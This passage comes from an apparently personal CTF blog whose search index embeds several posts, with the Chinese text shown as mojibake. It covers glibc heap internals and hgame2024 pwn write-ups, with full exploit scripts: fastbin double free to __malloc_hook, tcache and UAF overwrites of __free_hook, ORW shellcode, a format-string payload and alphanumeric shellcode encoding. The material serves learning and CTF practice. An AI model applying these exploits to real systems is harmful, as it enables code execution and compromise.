2. å½“ä¸€ä¸ªå †å—åŠ è¿›fast binæ—¶ï¼Œä¸ä¼šå¯¹ä¸‹ä¸€ä¸ªå †å—çš„PREV_INUSEè¿›è¡ŒéªŒè¯ï¼ˆä½†æ˜¯ä¼šå¯¹ä¸‹ä¸€ä¸ªå †å—sizeçš„åˆæ³•æ€§è¿›è¡Œæ£€æŸ¥ï¼‰ï¼ŒåŒæ ·åœ°ï¼Œå°†ä¸€ä¸ªå †å—ä»fast binä¸­é‡Šæ”¾çš„æ—¶å€™ï¼Œä¹Ÿä¸ä¼šå¯¹å…¶ä¸‹ä¸€ä¸ªå †å—çš„PREV_INUSEè¿›è¡Œæ›´æ”¹ï¼ˆä¹Ÿä¸ä¼šæ”¹ä¸‹ä¸€ä¸ªå †å—çš„PREV_SIZEï¼‰ï¼Œåªæœ‰è§¦å‘&lt;code&gt;malloc_consolidate()&lt;/code&gt;åæ‰ä¼šæ”¹ä¸‹ä¸€ä¸ªå †å—çš„PREV_INUSEã€‚&lt;br&gt;
3. åˆ©ç”¨&lt;code&gt;find_fake_fast target_addr&lt;/code&gt;gdbå‘½ä»¤å¯ä»¥æ‰¾åˆ°ç›®æ ‡åœ°å€é™„è¿‘çš„fake fast binï¼Œåªè€ƒè™‘sizeå¤§å°å³å¯ï¼Œä¸éœ€è¦è€ƒè™‘å¯¹é½&lt;br&gt;
4. &lt;code&gt;p &amp;amp;global_max_fast&lt;/code&gt;å¯ä»¥æ‰¾åˆ°MAX_FAST_SIZEè®¾ä¸º0ï¼Œç¦ç”¨fast&lt;/p&gt;
&lt;h3 id=&#34;malloc_consolidate&#34;&gt;malloc_consolidate()&lt;/h3&gt;
&lt;p&gt;å…¶æœ¬èº«ä¼šå°†fast binå†…çš„chunkå–å‡ºæ¥ï¼Œä¸ç›¸é‚»çš„free chunkåˆå¹¶åæ”¾å…¥unsorted binï¼Œæˆ–å¹¶å…¥top chunkï¼ˆå¦‚æœæ— æ³•ä¸ç›¸é‚»çš„åˆå¹¶ï¼Œå°±ç›´æ¥å°†å…¶æ”¾å…¥unsorted binï¼‰ï¼Œç„¶åç”±äºç”³è¯·çš„large chunkæ˜¾ç„¶åœ¨fast bin,small binå†…éƒ½æ‰¾ä¸åˆ°ï¼Œäºæ˜¯éå†unsorted binï¼Œå°†å…¶ä¸­å †å—æ”¾å…¥small bin,large binï¼Œå› æ­¤æœ€ç»ˆçš„æ•ˆæœå°±æ˜¯fast binå†…çš„chunkä¸å‘¨å›´çš„chunkåˆå¹¶äº†ï¼ˆæˆ–æ˜¯è‡ªèº«ç›´æ¥è¿›å…¥äº†unsorted binï¼‰ï¼Œæœ€ç»ˆè¢«æ”¾å…¥äº†small bin,large binï¼Œæˆ–è€…è¢«å¹¶å…¥äº†top chunkï¼Œå¯¼è‡´fast binå‡ä¸ºç©ºã€‚&lt;/p&gt;
&lt;h4 id=&#34;è§¦å‘æ¡ä»¶&#34;&gt;è§¦å‘æ¡ä»¶ï¼š&lt;/h4&gt;
&lt;p&gt;1.ç”³è¯·ä¸€ä¸ªå¤§äºlarge chunkæœ€å°å¤§å°ï¼ˆåŒ…æ‹¬å½“ç”³è¯·çš„chunkéœ€è¦è°ƒç”¨brk()ç”³è¯·æ–°çš„top chunkæˆ–è°ƒç”¨mmap()å‡½æ•°æ—¶ï¼‰çš„å †å—&lt;br&gt;
2.è‹¥freeçš„chunkå’Œç›¸é‚»çš„free chunkåˆå¹¶åçš„sizeå¤§äºFASTBIN_CONSOLIDATION_THRESHOLD(64kå³0x10000)ï¼ˆåŒ…æ‹¬ä¸top chunkåˆå¹¶ï¼‰&lt;/p&gt;
&lt;h2 id=&#34;unsorted-binåŒé“¾è¡¨å…ˆè¿›å…ˆå‡º&#34;&gt;unsorted binï¼ˆåŒé“¾è¡¨ï¼Œå…ˆè¿›å…ˆå‡ºï¼‰&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;æ³„éœ²libc&lt;/strong&gt;ï¼šunsorted_binä¸­æœ€å…ˆè¿›æ¥çš„free chunkçš„fdæŒ‡é’ˆå’Œæœ€åè¿›æ¥çš„free chunkçš„bkæŒ‡é’ˆå‡æŒ‡å‘äº†main_arenaä¸­çš„ä½ç½®ï¼Œåœ¨64ä½ä¸­ï¼Œä¸€èˆ¬æ˜¯&amp;lt;main_arena+88&amp;gt;æˆ–&amp;lt;main_arena+96&amp;gt;ï¼Œå…·ä½“å—libcå½±å“ï¼Œä¸”main_arenaçš„ä½ç½®ä¸__malloc_hookç›¸å·®0x10ï¼Œè€Œåœ¨32ä½çš„ç¨‹åºä¸­ï¼Œmain_arenaçš„ä½ç½®ä¸__malloc_hookç›¸å·®0x18ï¼ŒåŠ å…¥åˆ°unsorted binä¸­çš„free chunkçš„fdå’Œbké€šå¸¸æŒ‡å‘&amp;lt;main_arena+48&amp;gt;çš„ä½ç½®ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;libc_base = leak_addr - libc.symbols[&#39;__malloc_hook&#39;] - 0x10 - 88
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;æ³¨æ„&lt;/strong&gt;ï¼šä»è¯¥binså–å‡ºçš„chunkä¸ä¼šå¯¹sizeè¿›è¡Œæ£€æŸ¥&lt;/p&gt;
&lt;h2 id=&#34;small-bins0x20~0x3f0åŒé“¾è¡¨å…ˆè¿›å…ˆå‡º&#34;&gt;small bins(0x20~0x3F0)ï¼ˆåŒé“¾è¡¨ï¼Œå…ˆè¿›å…ˆå‡ºï¼‰&lt;/h2&gt;
&lt;h2 id=&#34;large-bins0x400~åŒé“¾è¡¨å…ˆè¿›å…ˆå‡º&#34;&gt;large bins(0x400~)ï¼ˆåŒé“¾è¡¨ï¼Œå…ˆè¿›å…ˆå‡ºï¼‰&lt;/h2&gt;
&lt;h1 id=&#34;è¿›å…¥å¤§å¾ªç¯æœ‰2æ¡è·¯å¾„&#34;&gt;è¿›å…¥å¤§å¾ªç¯æœ‰2æ¡è·¯å¾„&lt;/h1&gt;
&lt;p&gt;1ã€è¯·æ±‚çš„å †å—ä¸ºlarge chunkã€‚&lt;br&gt;
2ã€small binä¸­å¯¹åº”çš„é‚£ä¸ªbinä¸ºç©º(small binåˆ†é…å¤±è´¥ï¼)&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1709372496189.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;free&#34;&gt;free&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709372505070.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">glibcå †åˆ©ç”¨</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/mprotect/"" data-c="
          &lt;h1 id=&#34;mprotect&#34;&gt;mprotect&lt;/h1&gt;
&lt;h2 id=&#34;å‡½æ•°åŸå‹&#34;&gt;å‡½æ•°åŸå‹&lt;/h2&gt;
&lt;p&gt;int mprotect(void * addr, size_t len, int prot)&lt;br&gt;
å…¶ä¸­å˜é‡addrä»£è¡¨å¯¹åº”å†…å­˜å—çš„æŒ‡é’ˆï¼Œlenä»£è¡¨å†…å­˜å—çš„å¤§å°ï¼Œè€Œprotä»£è¡¨å†…å­˜å—æ‰€æ‹¥æœ‰çš„æƒé™&lt;br&gt;
å¯¹äºprotæ¥è¯´ï¼Œå¯¹åº”æƒé™ä¾ç…§ä»¥ä¸‹è§„åˆ™æ”¹å˜å€¼&lt;/p&gt;
&lt;p&gt;æ— æ³•è®¿é—® å³PROT_NONEï¼šä¸å…è®¸è®¿é—®ï¼Œå€¼ä¸º 0&lt;br&gt;
å¯è¯»æƒé™ å³PROT_READï¼šå¯è¯»ï¼Œå€¼åŠ  1&lt;br&gt;
å¯å†™æƒé™ å³PROT_WRITEï¼šå¯è¯»ï¼Œ å€¼åŠ  2&lt;br&gt;
å¯æ‰§è¡Œæƒé™ å³PROT_EXECï¼šå¯æ‰§è¡Œï¼Œå€¼åŠ  4&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ï¼šæˆ‘ä»¬è¦å°†æŸå—å†…å­˜åŒºåŸŸæƒé™è®¾ç½®ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œé‚£ä¹ˆmprotectå‡½æ•°ä¸­protå‚æ•°ä¾¿åº”è¯¥æ˜¯1+2+4=7ã€‚&lt;/p&gt;
&lt;h1 id=&#34;mmap&#34;&gt;mmap&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1710037729602.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">mprotectï¼Œmmap</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/hgame2024week2/"" data-c="
          &lt;h1 id=&#34;shellcodemaster&#34;&gt;shellcodemaster&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709463523175.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1709463620333.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°å¼€äº†æ²™ç›’banæ‰äº†execveç­‰å‡½æ•°ï¼Œåªèƒ½æ‰“orwï¼Œç„¶åæ˜¯å…ˆmmapäº†ä¸€å—rwxçš„å†…å­˜ï¼Œç„¶åè¯»å–22ä¸ªå­—èŠ‚å»æ‰§è¡Œï¼Œç„¶åæŠŠæƒé™æ”¹ä¸ºäº†å¯æ‰§è¡Œï¼ˆ4ï¼‰ï¼Œå¹¶ä¸”æŠŠå¯„å­˜å™¨æ”¾ç½®äº†ä¸€äº›å€¼ï¼Œ22ä¸ªå­—èŠ‚å»æ‰“orwè‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥éœ€è¦å†æ¬¡å‘è¯¥åœ°å€å†™å…¥å¹¶æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦å…ˆæ‰“å¼€å¯å†™æƒé™ï¼Œç”±äºå„ä¸ªå¯„å­˜å™¨é«˜å››å­—èŠ‚å‡ä¸º0ï¼Œæ‰€ä»¥æ”¹ä½å››å­—èŠ‚å³å¯ï¼ˆä½¿ç”¨çš„å­—èŠ‚ä¹Ÿæ›´å°‘ï¼‰&lt;/p&gt;
&lt;h2 id=&#34;shlæŒ‡ä»¤&#34;&gt;shlæŒ‡ä»¤&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;shl edi,12            #ediå¯„å­˜å™¨çš„å€¼å‘å·¦ç§»12bitsï¼Œç”¨0è¡¥
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;cdqæŒ‡ä»¤&#34;&gt;cdqæŒ‡ä»¤&lt;/h2&gt;
&lt;p&gt;æŠŠEDXçš„æ‰€æœ‰ä½éƒ½è®¾æˆEAXæœ€é«˜ä½çš„å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“EAX &amp;lt;80000000, EDX ä¸º00000000ï¼›å½“EAX &amp;gt;= 80000000ï¼Œ EDX åˆ™ä¸ºFFFFFFFF&lt;/p&gt;
&lt;p&gt;æ¢å¤æƒé™åè°ƒç”¨readå‡½æ•°å†™å…¥orwçš„shellcodeå³å¯&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import*
p=process(&amp;quot;./vuln&amp;quot;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)
gdb.attach(p)
shellcode1=&#39;&#39;&#39;
shl edi,12
mov dx, 0x7
mov ax, 10
syscall
cdq
mov esi, edi
xor edi, edi
xor eax, eax
syscall
&#39;&#39;&#39;
p.send(asm(shellcode1))
shellcode_orw = asm(&#39;&#39;&#39;
push 0x67616c66
mov rdi,rsp
xor esi,esi
push 2
pop rax
syscall
mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall
mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
&#39;&#39;&#39;)
p.sendline(b&#39;\x90&#39;*0x16 + asm(&amp;quot;shl rsp, 12; add rsp, 0x500;&amp;quot;) + shellcode_orw)
#nopæ»‘æ¿åªè¦å¤§äº22å­—èŠ‚å°±è¡Œï¼Œä¸»è¦ä¸ºäº†é…åˆæ‰§è¡Œæµï¼Œè°ƒèŠ‚æ ˆé¡¶æ–¹ä¾¿pushå’Œpop
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;old_fastnote&#34;&gt;old_fastnote&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709630337061.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°gotè¡¨æ— æ³•æ›´æ”¹ï¼Œç¨‹åºä¹Ÿæ²¡æœ‰editå‡½æ•°ï¼Œ2.23ç‰ˆæœ¬çš„libcï¼Œæ²¡æœ‰tcache binï¼Œç¨‹åºä¹Ÿæ²¡åé—¨ï¼Œåªèƒ½ä»libcå…¥æ‰‹ï¼Œæ‰€ä»¥é¦–å…ˆå°±è¦é€šè¿‡unsorted binæ³„éœ²libcåŸºåœ°å€ï¼Œç„¶åå¯ä»¥åˆ©ç”¨double freeæ¼æ´å®ç°__malloc_hookçš„æ›´æ”¹ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä»fast binä¸­å–å‡ºchunkæ—¶ä¼šæ£€æŸ¥sizeï¼Œä½†æ˜¯ä¸è¦æ±‚å¯¹é½ï¼Œgdbæœ‰ä¸“é—¨çš„å·¥å…·æŒ‡ä»¤&lt;code&gt;find_fake_fast target_addr&lt;/code&gt;ï¼Œå¯ä»¥æ‰¾åˆ°ç›®æ ‡åœ°å€é™„è¿‘çš„fake chunkï¼Œå°†__malloc_hookæ”¹ä¸ºone_gadgetså³å¯æ‹¿åˆ°shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./vuln&#39;)
libc = ELF(&#39;./libc-2.23.so&#39;)
def add(idx,size,content):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;Size: &amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;Content: &amp;quot;)
	p.sendline(content)

def show(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;2&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	
def dele(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;3&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
#gdb.attach(p)

add(0,0x80,b&#39;a&#39;*8)
add(1,0x60,b&#39;a&#39;*8)
add(2,0x60,b&#39;a&#39;*8)
dele(0)
add(0,0x80,&#39;\x78&#39;)
show(0)
base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x3C0A78
malloc_hook = base + libc.sym[&#39;__malloc_hook&#39;]
one = 0xf1247
gadget = base + one
fake = malloc_hook - 0x23 
add(0, 0x80, b&#39;a&#39;) 
dele(1) 
dele(2) 
dele(1) 
add(3, 0x60, p64(fake)) 
print(hex(malloc_hook))
add(4, 0x60, b&#39;a&#39;) 
add(5, 0x60, b&#39;a&#39;) 
add(6, 0x60, b&#39;a&#39; * 0x13 + p64(gadget)) 
#pause()
p.recvuntil(&amp;quot;:&amp;quot;)
p.sendline(b&amp;quot;1&amp;quot;)
p.recvuntil(&amp;quot;Index: &amp;quot;)
p.sendline(str(11))
p.recvuntil(&amp;quot;Size: &amp;quot;)
p.sendline(str(0x60))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œæ”¹å®Œ_malloc_hookä¹‹åè§¦å‘double freeé”™è¯¯ä¹Ÿå¯ä»¥æ‹¿åˆ°shellï¼ˆå®é™…ä¸Šå½“printfå‡½æ•°è¾“å‡ºè¾ƒå¤šå†…å®¹æ—¶ä¹Ÿä¼šè°ƒç”¨mallocå’Œfreeå‡½æ•°æ¥ç”³è¯·é‡Šæ”¾ç¼“å†²åŒºï¼Œscanfå‡½æ•°ä¹Ÿæ˜¯å¦‚æ­¤ï¼‰&lt;br&gt;
è¯¦æƒ…è§ï¼š&lt;a href=&#34;https://blog.osiris.cyber.nyu.edu/2017/09/30/csaw-ctf-2017-auir/&#34;&gt;https://blog.osiris.cyber.nyu.edu/2017/09/30/csaw-ctf-2017-auir/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;elden-ring-ii&#34;&gt;Elden Ring â…¡&lt;/h1&gt;
&lt;p&gt;2.31çš„libcï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œå…ˆåˆ©ç”¨unsorted binæ³„éœ²libcåŸºåœ°å€ï¼Œç„¶ååˆ©ç”¨UAFæ¼æ´ç”³è¯·å¹¶ä¿®æ”¹free_hookå¾—åˆ°shell(ç”±äºåªèƒ½ç”³è¯·16æ¬¡ï¼Œå¹¶ä¸”ä¸èƒ½é‡å¤ç”³è¯·ç›¸åŒçš„é¡µæ•°ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨double freeæ¼æ´)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./vuln&#39;)
libc = ELF(&#39;./libc.so.6&#39;)
def add(idx,size):
	p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)
	p.sendline(b&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;Size: &amp;quot;)
	p.sendline(str(size))
	
def edit(idx,content):
	p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)
	p.sendline(b&amp;quot;3&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;Content: &amp;quot;)
	p.sendline(content)

def show(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)
	p.sendline(b&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	
def dele(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;quot;)
	p.sendline(b&amp;quot;2&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))

#gdb.attach(p)
for i in range (0,8):
	add(i,0x90)
add(8,0x20)
for i in range (0,8):
	dele(i)
show(7)
libc_base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x7f4d259cebe0 + 0x7f4d25843c90 - 0x61C90
__free_hook = libc_base + libc.sym[&amp;quot;__free_hook&amp;quot;]
system_addr = libc_base + libc.sym[&amp;quot;system&amp;quot;]

add(9, 0x20)
add(10, 0x20)
dele(8)
dele(9)
edit(10, b&amp;quot;/bin/sh\x00&amp;quot;)
edit(9, p64(__free_hook))
pause()
add(11, 0x20)
add(12, 0x20)
edit(12, p64(system_addr))
dele(10)

p.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;fastnote&#34;&gt;fastnote&lt;/h1&gt;
&lt;p&gt;2.31çš„libcï¼Œdouble free + tcache&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./vuln&#39;)
libc = ELF(&#39;./libc-2.31.so&#39;)
def add(idx,size,content):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;Size: &amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;Content: &amp;quot;)
	p.sendline(content)

def show(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;2&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	
def dele(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(b&amp;quot;3&amp;quot;)
	p.recvuntil(&amp;quot;Index: &amp;quot;)
	p.sendline(str(idx))
	
#gdb.attach(p)
for i in range (0,8):
	add(i,0x80,&#39;a&#39;)
add(8,0x20,&#39;a&#39;)
for i in range (0,8):
	dele(i)
show(7)
libc_base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x7f4d259cebe0 + 0x7f4d25843c90 - 0x61C90
__free_hook = libc_base + libc.sym[&amp;quot;__free_hook&amp;quot;]
system_addr = libc_base + libc.sym[&amp;quot;system&amp;quot;]
print(hex(libc_base))
for i in range (0,10):
	add(i,0x20,&#39;a&#39;)
add(10,0x20,&#39;a&#39;)
for i in range (0,8):
	dele(i)
dele(8)
dele(9)
dele(8)
for i in range (0,7):
	add(i,0x20,&#39;/bin/sh&#39;)
add(7,0x20,p64(__free_hook))
add(8,0x20,p64(__free_hook))
add(9,0x20,p64(system_addr))
add(10,0x20,p64(system_addr))
dele(6)
#pause()

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">hgame2024(week2)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/alpha3-he-ae64-shi-yong/"" data-c="
          &lt;h1 id=&#34;alpha3&#34;&gt;alpha3&lt;/h1&gt;
&lt;p&gt;1.ç”Ÿæˆshellcode&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context.arch=&#39;amd64&#39;
sc = shellcraft.sh()
print asm(sc)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.å°†ä¸Šè¿°ä»£ç ä¿å­˜æˆsc.pyæ”¾åˆ°alpha3ç›®å½•ä¸‹ï¼Œç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ç”Ÿæˆå¾…ç¼–ç çš„shellcodeæ–‡ä»¶&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python sc.py &amp;gt; shellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;3.ä½¿ç”¨&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&amp;quot;shellcode&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘è¿™é‡Œåªèƒ½ç”¨python2ï¼Œä¸ç„¶è¯´æˆ‘ç¼ºå°‘ä¸€äº›åº“ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;x86 ascii uppercase (æ•°å­—+å¤§å†™å­—æ¯)

x86 ascii lowercase (æ•°å­—+å°å†™å­—æ¯)

x86 ascii mixedcase (æ•°å­—+å¤§å°å†™å­—æ¯)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Valid base address examples for each encoder, ordered by encoder settings,
are:

[x64 ascii mixedcase]
  AscMix (r64)              RAX RCX RDX RBX RSP RBP RSI RDI

[x86 ascii lowercase]
  AscLow 0x30 (rm32)        ECX EDX EBX

[x86 ascii mixedcase]
  AscMix 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI] [ESP-4]
                            ECX+2 ESI+4 ESI+8
  AscMix 0x30 (i32)         (address)
  AscMix Countslide (rm32)  countslide:EAX+offset~uncertainty
                            countslide:EBX+offset~uncertainty
                            countslide:ECX+offset~uncertainty
                            countslide:EDX+offset~uncertainty
                            countslide:ESI+offset~uncertainty
                            countslide:EDI+offset~uncertainty
  AscMix Countslide (i32)   countslide:address~uncertainty
  AscMix SEH GetPC (XPsp3)  seh_getpc_xpsp3

[x86 ascii uppercase]
  AscUpp 0x30 (rm32)        EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]

[x86 latin-1 mixedcase]
  Latin1Mix CALL GetPC      call

[x86 utf-16 uppercase]
  UniUpper 0x10 (rm32)      EAX ECX EDX EBX ESP EBP ESI EDI [EAX] [ECX]
                            [EDX] [EBX] [ESP] [EBP] [ESI] [EDI]
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ae64&#34;&gt;AE64&lt;/h1&gt;
&lt;p&gt;ä½¿ç”¨&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from ae64 import AE64

context.log_level = &#39;debug&#39;
context.arch = &#39;amd64&#39;

p = process(&#39;./example1&#39;)

obj = AE64()
sc = obj.encode(asm(shellcraft.sh()),&#39;r13&#39;)

p.sendline(sc)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">alpha3å’ŒAE64ä½¿ç”¨</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/hgame2024week-1-ezfmt-string/"" data-c="
          &lt;p&gt;è¿™é“é¢˜è¦æ³¨æ„æœ¬åœ°gdbè°ƒè¯•ç¬¬åå…«ä¸ªå‚æ•°å¯èƒ½å•¥éƒ½æ²¡æœ‰ï¼Œä½†æ˜¯ç”¨pythoné™„åŠ è°ƒè¯•çš„æ—¶å€™å°±è¹¦å‡ºæ¥ä¸ªä¸‰è¿ğŸ˜‡&lt;br&gt;
å­¦ä¹ è„šæœ¬å¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)

#io=remote(&amp;quot;47.100.137.175&amp;quot;,31992)
io=process(&amp;quot;./vuln&amp;quot;)

#gdb.attach(io)
# pause()

backdoor=0x401245

io.recvuntil(b&amp;quot;?\n&amp;quot;)

payload=&amp;quot;%{}c%{}$hn&amp;quot;.format((backdoor)&amp;amp;0xffff,18).encode()
payload=payload.ljust(0x40,b&amp;quot;\x00&amp;quot;)+b&amp;quot;\xc8&amp;quot;
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">hgame2024(week 1) ezfmt string</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ezheap/"" data-c="
          &lt;p&gt;æŸ¥çœ‹ä¿æŠ¤ï¼ˆlibcç‰ˆæœ¬ä¸º2.27ï¼‰&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708954216740.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä¿æŠ¤å…¨å¼€,è™½ç„¶æœ‰itemlistï¼Œå­˜åœ¨chunkçš„åœ°å€ï¼Œä½†æ˜¯å¼€äº†PIEï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨unlinkè¿›è¡Œæ•°æ®ä¿®æ”¹ï¼Œå¹¶ä¸”ç¨‹åºä¸å­˜åœ¨åé—¨å‡½æ•°ï¼Œä½†æ˜¯å¼€äº†ä¸€å—å¯å†™å¯æ‰§è¡Œçš„åœ°å€å—ï¼Œå¹¶ä¸”è¿è¡Œæ—¶ä¼šå°†è¯¥åœ°å€æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥ä¸»è¦æ”»å‡»æ€è·¯&lt;strong&gt;å°±æ˜¯æŠŠshellcodeå†™å…¥æ­¤åœ°å€ï¼Œç„¶åå¯ä»¥é€šè¿‡åŠ«æŒmalloc_hookå‡½æ•°æ‰§è¡Œshellcodeæ‹¿åˆ°shell&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;allocå‡½æ•°&#34;&gt;allocå‡½æ•°&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709285505525.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;delå‡½æ•°&#34;&gt;delå‡½æ•°&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709285410846.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;fillè¯»å–å‡½æ•°&#34;&gt;fillè¯»å–å‡½æ•°&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709285449379.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°å­˜åœ¨off by NULLæ¼æ´&lt;/p&gt;
&lt;h1 id=&#34;ä¸»è¦æ€è·¯&#34;&gt;ä¸»è¦æ€è·¯&lt;/h1&gt;
